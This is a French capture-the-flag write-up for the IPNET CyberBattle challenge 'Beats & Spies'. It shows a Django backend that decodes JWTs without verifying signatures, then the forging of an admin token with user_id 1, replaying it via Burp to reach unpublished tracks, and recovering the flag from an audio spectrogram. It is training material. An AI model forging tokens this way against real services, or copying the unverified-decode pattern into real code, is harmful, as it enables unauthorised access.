---
# Imported from Obsidian: CTF/Writeup IPNET Cyberbattle/🚩 Writeup Beats & Spies - La Conspiration AklaaX.md
title: Beats & Spies - La Conspiration AklaaX
category: Steganography
ctf: IPNET CyberBattle (archive)
date: 2026-03-05
summary: Il s'agit d'une page de connexion , qui nous demande nos credentials avant de se connecter. Ce qu'on a pas. par contre on a la possibilité de créer un compte, donc cliquez sur…
tags:
- ipnet-cyberbattle
- steganography
lang: fr
imported: true
---

### Catégorie : Web | Steganography | Crypto

##### Auteur : s1uxn3t 
#### Outil :
- **Burpsuite** 
- **Audacity**
- **wget**
- **Cyberchef**
- **Jwt.io**
### Tâche 1 : Accéder à la page web : 

![Screenshot](./images/obsidian/beats-spies-la-conspiration-aklaax/pasted-image-20260305134622.png)

Il s'agit d'une page de connexion , qui nous demande nos credentials avant de se connecter. Ce qu'on a pas. par contre on a la possibilité de créer un compte, donc cliquez sur Register pour créer un compte. 

Une fois créer le compte cliquez sur login pour vous connecter.  On ainsi rediriger  l'Endpoint /**api/beats**

![Screenshot](./images/obsidian/beats-spies-la-conspiration-aklaax/pasted-image-20260308190252.png)

Lorsqu'on est connecté, on peut voir les beats publiés et dont on a accès. Et on a un rôle qui nous a été attribué qui est le rôle **Visitor**. Ce qui signifie que pour lire les beats non publiés il faut qu'on arrive a avoir le Rôle **Admin**. 

### Tâche 2 . Analyse de la requête avec Burpsuite 

Nous allons utiliser l'outil Burpsuite pour intercepter la requête après la connexion pour voir les autorisations.  
Etape : 
- Dans **burpsuite** , utiliser le **proxy** de burpsuite pour intercepter la requête
- Saisir vos identifiants et connecter vous. et ensuite cliquez sur **Foward** pour laisser passer la requête 

Une fois connecté, dans le proxy de Burpsuite, allez dans **HTTP History** et consulter la requête de la page **/api/beats** 

![Screenshot](./images/obsidian/beats-spies-la-conspiration-aklaax/pasted-image-20260308191839.png)

Dans la requête on peut voir un header intéressant qui est **Authorizations  : bearer** qui est utilisé dans les requêtes pour préciser les token JWT. Donc ici on a le token JWT de l'utilisateur
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzczMDgzMjQ1LCJpYXQiOjE3NzI5OTY4NDUsImp0aSI6ImY2NTQ4OTk1NWViNjQ5MTI4NDAzMWQ4MDY5MWE5MDU3IiwidXNlcl9pZCI6MjEsInJvbGUiOiJWaXNpdG9yIn0.o6JYacR_x03gH2vrHiTRvp9y_8D4uNlwQi4bSQAQ9Lw
```

Nous allons utiliser l'outil est ligne pour décoder le token et l'analyser 
url de l'outil : (https://jwt.io)

![Screenshot](./images/obsidian/beats-spies-la-conspiration-aklaax/pasted-image-20260308192555.png)

En gros lorsque l'utilisateur est connecté, il recoit un token précisant le type de token (qui est token d'accès), l'id de l'utilisateur ( l'id attribué a notre utilisateur est 21) et le role associé (dans notre cas , il lui a attribué le rôle de Visitor) ce qui permet de géré l'authentification et l'autorisation. 

Si nous revenons en arrière sur la page de connexion, l'utilisateur nous offre la possibilité de consulter son code source qu'il a déposé sous GitHub , donc nous allons cliquez dessus pour nous analyser la structure et le fonctionnement de la connexion.
![Screenshot](./images/obsidian/beats-spies-la-conspiration-aklaax/pasted-image-20260308212822.png)

URL : (https://github.com/aklaaX/beatsBackend)
### Tâche 3: Analyser le code source 

Dans le code source on a 4 apps notamment le **Beats, le Blog , le Core et Source**. Après analyse , l'app le plus interressant est le Core car il s'agit de l'app principal.

Lorsqu'on accède à l'app **Core**, on remarque un dossier nommé Auth qui contient des moyens utilisés pour s'authentifier 

![Screenshot](./images/obsidian/beats-spies-la-conspiration-aklaax/pasted-image-20260305135616.png)

Boom on a un fichier intéressant nommé **backend.py** qui contient les moyens d'authentification coté backend. 

**Contenu du code :** 
```
# myproject/auth/backends.py
from rest_framework_simplejwt.backends import TokenBackend

class UnsafeTokenBackend(TokenBackend):
    def __init__(self, algorithm='HS256'):
        # On garde la clé de signature pour émettre
        super().__init__(
            algorithm=algorithm,
            #signing_key='super-secret-key-used-for-signing'
        )
        

    def decode(self, token, verify=True):
        # ⚠️ On désactive la vérification malgré la présence de la signature
        return super().decode(token, verify=False)
```

Après analyse, on constate que l'administrateur utilise l'authentification par token **JWT (Json Web Token )** 

#### Note : 
Un JWT est une information codée par JSON généralement utilisé pour l'authentification et l'échange d'information. Les JWT sont sécurité par la signature numérique garantissant l'intégrité et l'authentification des données. En gros le but du JWT est de faciliter l'authentification et l'autorisation de l'utilisateur. 
**Structure d'un JWT** 
Un JWT comprend 3 partie : 
- **L'en-tête :** Cette partie comprend l'algorithme de signature et le type de token 
- **La charge utile (payload) :** qui contient les données à transporter ( exemple : Username et Password )
- **La signature :** Créée en combinant et en signant le le Head et le Payload

Dans notre cas, l'algorithme de signature utilisée est le HS256 mais la vulnérabilité se trouve au niveau de la fonction decode ou le programme ne vérifie pas la signature provenant de l'en-tête et de la charge utile (payload). Donc n'importe qui peut fabriquer son token et accéder en tant qu'admin  ( Il s'agit ainsi de la vulnérabilité JWT Authentification Bypass).

Ainsi nous pour exploiter cette vulnérabilité,  **nous allons forger un token JWT ayant pour id 1 (qui est l'id de l'admin) et indiquer le rôle Admin** avec n'importe qu'elle signature pour nous connecter en tant qu'admin 
### Tâche 4- Forger le token 

Nous allons forger un token ayant l'id de l'Admin et ayant pour rôle Admin. 

Nous allons modifier le **paylaod** (la charge utile) du token comme suit : 
```
{
  "token_type": "access",
  "exp": 1773083245,
  "iat": 1772996845,
  "jti": "f65489955eb6491284031d80691a9057",
  "user_id": 1,
  "role": "Admin"
}
```
Une fois modifier, nous utiliser l'outil en ligne Cyberchef pour l'encoder 

```
ewogICJ0b2tlbl90eXBlIjogImFjY2VzcyIsCiAgImV4cCI6IDE3NzMwODMyNDUsCiAgImlhdCI6IDE3NzI5OTY4NDUsCiAgImp0aSI6ICJmNjU0ODk5NTVlYjY0OTEyODQwMzFkODA2OTFhOTA1NyIsCiAgInVzZXJfaWQiOiAxLAogICJyb2xlIjogIkFkbWluIgp9
```
Vu que le système ne vérifie pas la signature on peu directement remplacer la partie paylaod et envoyé 

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.ewogICJ0b2tlbl90eXBlIjogImFjY2VzcyIsCiAgImV4cCI6IDE3NzMwODMyNDUsCiAgImlhdCI6IDE3NzI5OTY4NDUsCiAgImp0aSI6ICJmNjU0ODk5NTVlYjY0OTEyODQwMzFkODA2OTFhOTA1NyIsCiAgInVzZXJfaWQiOiAxLAogICJyb2xlIjogIkFkbWluIgp9.o6JYacR_x03gH2vrHiTRvp9y_8D4uNlwQi4bSQAQ9Lw
```

### Tâche 5- Se connecter en tant qu'admin 

Nous allons maintenant utiliser ce token forgé pour nous connecter en tant qu'admin. 

**Etape :** 
- Réactualiser la page 
- Faite Foward pour faire passer la première requête 
- Et aussi niveau de la deuxième requête GET **/api/beats**, cliquez tout droit et ensuite send to repeater pour envoyer au repeater
- Remplacer l'ancien token par le token forgé 

![Screenshot](./images/obsidian/beats-spies-la-conspiration-aklaax/pasted-image-20260308195900.png)

Boom on  es connecté en tant qu'admin et on peu voir le beats non publié 
```
{"id":4,"artist":null,"title":"4. Nous vaincrons","duration":"2:00","audio":"http://vulnbackend.dev.safeticket.app/beats/audio/beats/audio/4.Nous_vaincrons.mp3","coverImage":null,"isPublished":false,"genre":"Trap","description":"COAGULA COAGULA COAGULAAAARHHHHH","created_at":"2025-06-07T00:43:38.030853Z","updated_at":"2025-06-07T00:43:38.030917Z"},
```

Utiliser la commande suit pout télécharger le fichier 

```
wget http://vulnbackend.dev.safeticket.app/beats/audio/beats/audio/4.Nous_vaincrons.mp3
```

### Tâche 6- Analyse de l'audio avec audacity

Nous allons ouvrir le fichier audio dans l'outil audacity et analyser les spectrogrammes

Dans Audacity, a côté du nom du fichier, cliquez sur la liste d'outil et ensuite spectogramme 

![Screenshot](./images/obsidian/beats-spies-la-conspiration-aklaax/pasted-image-20260308201353.png)

On peut ainsi voir le flag directement. 
NB : Si vous ne voyez pas , essayer de zoomer car il apparaît petit de base.
### Flag 🚩 : 

```
IPNET{ex1ft00l_m0uwoè_wo}
```
